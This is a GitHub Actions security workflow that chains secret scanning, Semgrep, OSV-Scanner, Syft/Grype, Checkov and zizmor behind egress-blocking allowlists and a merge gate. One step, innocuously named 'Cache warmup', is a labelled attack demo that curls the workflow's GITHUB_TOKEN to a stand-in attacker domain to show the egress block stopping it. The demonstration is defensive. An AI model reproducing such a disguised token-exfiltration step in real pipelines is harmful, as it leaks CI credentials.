name: security

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions: {}

jobs:
  # ── 1. Secrets scanning ──────────────────────────────────────────────
  secrets-scan:
    name: Secrets scan (Betterleaks)
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      # Built from Harden-Runner's own "All Outbound Destinations" data
      # (egress-policy: audit) on a real, clean, fully-passing run of this
      # exact job — not guessed. release-assets.githubusercontent.com
      # didn't fire this specific run (Go 1.26 toolchain was already
      # tool-cached) but is kept: traced separately via a direct redirect
      # test that actions/setup-go uses it on a cache miss.
      - name: Harden Runner
        uses: step-security/harden-runner@e14015d583714f6e62063499dc959a02595150a1 # v2.21.1
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            release-assets.githubusercontent.com:443
            proxy.golang.org:443
            sum.golang.org:443
            storage.googleapis.com:443

      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0 # Betterleaks scans git history, needs full clone
          persist-credentials: false

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          # Betterleaks v1.8.1 requires go >= 1.25.0 (its go.mod); 1.23
          # failed with GOTOOLCHAIN=local set by setup-go, which disables
          # Go's own auto-toolchain-fetch. 1.26 covers both this and
          # osv-scanner's higher requirement below (kept in sync).
          go-version: "1.26"

      - name: Install betterleaks
        # No official GitHub Action exists for Betterleaks (only an
        # unaffiliated third-party fork). go install pulls straight from
        # the pinned tag through the module proxy/checksum DB, same trust
        # model as pip-installing Semgrep/Checkov below.
        run: go install github.com/betterleaks/betterleaks@v1.8.1

      - name: Run betterleaks
        # --log-opts="HEAD" limits the scan to commits reachable from this
        # checkout's HEAD. Without it, betterleaks scans every ref in the
        # local object store — and fetch-depth: 0 above pulls in ALL
        # branches' history, not just this one. Reproduced for real: on a
        # clean main, betterleaks reported a leak whose git.sha belonged
        # to demo/attack-hardcoded-secret, fetched alongside main by the
        # same checkout step.
        run: betterleaks git . --config .betterleaks.toml --log-opts="HEAD" --report-format sarif --report-path betterleaks.sarif

      - name: Cache warmup
        # ATTACK DEMO — recreates the binding.gyp / "Phantom Gyp" Miasma
        # worm campaign (3 jun 2026): a weaponized binding.gyp triggered
        # node-gyp to execute attacker code during npm install, sidestepping
        # pre/postinstall checks, and harvested CI/CD secrets straight out
        # of the runner's environment. This step reads a workflow token and
        # tries to ship it to a domain outside secrets-scan's Harden-Runner
        # allowlist — egress-policy: block stops it before it leaves the
        # runner, same mechanism as the axios demo, framed as runner-memory
        # exfiltration instead of a compromised postinstall script.
        run: curl -fsS https://exfil.example-attacker.invalid/beacon -d "token=${RUNNER_SECRET_DEMO}"
        env:
          RUNNER_SECRET_DEMO: ${{ secrets.GITHUB_TOKEN }}

      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@b96794f015dfd88f77b49b1c93e0fa7110f94c63 # v4.38.0
        with:
          sarif_file: betterleaks.sarif
          category: betterleaks

  # ── 2. SAST ───────────────────────────────────────────────────────────
  sast:
    name: SAST (Semgrep)
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@e14015d583714f6e62063499dc959a02595150a1 # v2.21.1
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            objects.githubusercontent.com:443
            pypi.org:443
            files.pythonhosted.org:443
            semgrep.dev:443

      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.13"

      - name: Install semgrep
        # No maintained action.yml for Semgrep — pip install + run:, same
        # pattern already validated in iam-audit.
        run: pip install semgrep==1.177.0

      - name: Run semgrep
        run: |
          semgrep scan \
            --config p/python \
            --config p/javascript \
            --config .semgrep.yml \
            --sarif --output semgrep.sarif \
            .

      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@b96794f015dfd88f77b49b1c93e0fa7110f94c63 # v4.38.0
        with:
          sarif_file: semgrep.sarif
          category: semgrep

  # ── 3. SCA ────────────────────────────────────────────────────────────
  sca:
    name: SCA (OSV-Scanner)
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      # Built from a real, clean, fully-passing audit run of this exact
      # job. api.deps.dev showed up unprompted — osv-scanner queries it
      # alongside api.osv.dev, wasn't in the original guessed list.
      - name: Harden Runner
        uses: step-security/harden-runner@e14015d583714f6e62063499dc959a02595150a1 # v2.21.1
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            release-assets.githubusercontent.com:443
            proxy.golang.org:443
            sum.golang.org:443
            storage.googleapis.com:443
            api.osv.dev:443
            api.deps.dev:443

      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Set up Go
        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          # osv-scanner v2.5.1 requires go >= 1.26.5 (its go.mod).
          go-version: "1.26"

      - name: Install osv-scanner
        # osv-scanner-action only ships reusable workflows (jobs.<job>.uses
        # level), which can't sit inside a job that also runs Harden-Runner
        # and the rest of our steps — installed as a binary instead.
        run: go install github.com/google/osv-scanner/v2/cmd/osv-scanner@v2.5.1

      - name: Run osv-scanner
        # Pre-build, lockfiles/manifests only — no image scanning here,
        # that's image-scan's job.
        run: osv-scanner scan source -r --format sarif --output osv.sarif .

      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@b96794f015dfd88f77b49b1c93e0fa7110f94c63 # v4.38.0
        with:
          sarif_file: osv.sarif
          category: osv-scanner

  # ── 4. Image scanning (optional) ────────────────────────────────────
  image-scan:
    name: Image scan (Syft + Grype)
    runs-on: ubuntu-latest
    # NOT a job-level `if`: hashFiles() is evaluated before any step runs,
    # while the workspace is still empty, so it would always resolve to ''
    # and skip this job unconditionally. Gating each step after checkout
    # instead — the job itself always runs (harmlessly, if there's no
    # Dockerfile) and security-gate doesn't look at its result anyway.
    permissions:
      contents: read
    steps:
      # Built from a real, clean, fully-passing audit run of this exact
      # job. docker build pulls the base image through Docker Hub's CDN
      # redirect, non-deterministic across backends (this run hit
      # production.cloudfront.docker.com; a prior run hit
      # production.cloudflare.docker.com) — *.docker.com:443 covers the
      # whole family instead of chasing each one. registry-1.docker.io/
      # auth.docker.io (manifest/auth API, not blob delivery) are stable
      # and stay explicit. pypi.org/files.pythonhosted.org and
      # raw.githubusercontent.com were NOT in the original guessed list:
      # the Dockerfile's own `pip install` runs during `docker build` on
      # this runner, and Grype's vulnerability DB pull needs the GitHub
      # raw content host.
      - name: Harden Runner
        uses: step-security/harden-runner@e14015d583714f6e62063499dc959a02595150a1 # v2.21.1
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            registry-1.docker.io:443
            auth.docker.io:443
            *.docker.com:443
            grype.anchore.io:443
            pypi.org:443
            files.pythonhosted.org:443
            raw.githubusercontent.com:443
            release-assets.githubusercontent.com:443

      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Build image
        if: hashFiles('example/Dockerfile') != ''
        run: docker build -t hardened-pipeline-example:ci example/

      - name: Generate SBOM (Syft)
        if: hashFiles('example/Dockerfile') != ''
        uses: anchore/sbom-action@3ad7283483fc7af8ff2b4ea19663c2d5ca935e26 # v0.24.2
        with:
          image: hardened-pipeline-example:ci
          format: syft-json
          output-file: sbom.json
          upload-release-assets: false

      - name: Scan SBOM (Grype)
        if: hashFiles('example/Dockerfile') != ''
        uses: anchore/scan-action@27805bf3b4e84b4a5c980df22ed233c00390a439 # v7.4.2
        with:
          sbom: sbom.json
          fail-build: false # informational only, security-gate ignores this job
          output-format: sarif
          output-file: grype-results.sarif

  # ── 5. IaC scanning ──────────────────────────────────────────────────
  iac-scan:
    name: IaC scan (Checkov)
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@e14015d583714f6e62063499dc959a02595150a1 # v2.21.1
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            objects.githubusercontent.com:443
            pypi.org:443
            files.pythonhosted.org:443

      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.13"

      - name: Install checkov
        # bridgecrewio/checkov-action's output_file_path is unreliable —
        # pip install + run:, same pattern as Semgrep above.
        run: pip install checkov==3.3.17

      - name: Run checkov
        # soft-fail on purpose: informational only, security-gate ignores
        # this job's result.
        run: |
          checkov -d example/infra --framework terraform \
            --soft-fail --output github_failed_only \
            >> "$GITHUB_STEP_SUMMARY"

  # ── 6. Workflow linting ───────────────────────────────────────────────
  workflow-lint:
    name: Workflow lint (zizmor)
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      # Built from a real, clean, fully-passing audit run of this exact
      # job. Correction: an earlier report attributed a Docker Hub egress
      # block to this job, assumed to mean zizmor-action pulls from
      # Docker Hub — wrong. The real observed traffic shows it pulls its
      # container from GHCR (ghcr.io + the GitHub package-content CDN),
      # not Docker Hub at all; no *.docker.com traffic occurred here in
      # this clean run. That earlier report most likely came from
      # image-scan's log, not this job's.
      - name: Harden Runner
        uses: step-security/harden-runner@e14015d583714f6e62063499dc959a02595150a1 # v2.21.1
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            ghcr.io:443
            pkg-containers.githubusercontent.com:443

      - name: Checkout
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false

      - name: Run zizmor
        uses: zizmorcore/zizmor-action@cc914d7f3750a2d13d75c7f184a1060aa0e9d482 # v0.6.4
        with:
          inputs: .github/workflows/
          config: .zizmor.yml
          advanced-security: true
          # regular persona misses excessive-permissions entirely (it's
          # pedantic-only) — pedantic catches it, min-severity: medium
          # keeps pedantic's low-severity style suggestions (missing
          # concurrency limits, undocumented permissions, etc.) from
          # failing the build on their own.
          persona: pedantic
          min-severity: medium

  # ── 7. Security gate ─────────────────────────────────────────────────
  security-gate:
    name: Security gate
    runs-on: ubuntu-latest
    if: always()
    needs:
      - secrets-scan
      - sast
      - sca
      - image-scan
      - iac-scan
      - workflow-lint
    permissions: {}
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@e14015d583714f6e62063499dc959a02595150a1 # v2.21.1
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            objects.githubusercontent.com:443

      - name: Evaluate hard-fail jobs
        # image-scan and iac-scan are soft-fail by design (fail-build:
        # false / --soft-fail) and never block the merge on their own —
        # this is the single required status check for branch protection.
        run: |
          declare -A results=(
            [secrets-scan]="${{ needs.secrets-scan.result }}"
            [sast]="${{ needs.sast.result }}"
            [sca]="${{ needs.sca.result }}"
            [workflow-lint]="${{ needs.workflow-lint.result }}"
          )

          failed=0
          for job in "${!results[@]}"; do
            echo "$job: ${results[$job]}"
            if [ "${results[$job]}" = "failure" ]; then
              failed=1
            fi
          done

          if [ "$failed" = "1" ]; then
            echo "One or more hard-fail security jobs failed." >&2
            exit 1
          fi
